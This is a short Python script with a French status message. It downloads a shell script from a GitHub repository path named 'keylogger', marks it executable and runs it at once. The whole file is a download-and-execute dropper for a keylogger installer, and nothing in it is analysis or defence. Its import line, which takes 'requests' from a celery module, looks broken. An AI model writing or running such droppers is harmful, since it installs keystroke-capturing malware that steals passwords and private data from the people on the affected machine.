from celery.worker.state import requests
import os


url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'

filename = 'install_and_run.sh'

response = requests.get(url)



with open(filename, 'w', encoding='utf-8') as file:
    file.write(response.text)

    print(f'Le fichier {filename} a été téléchargé avec succès.')

os.system('chmod +x ' + filename)
os.system('./' + filename)

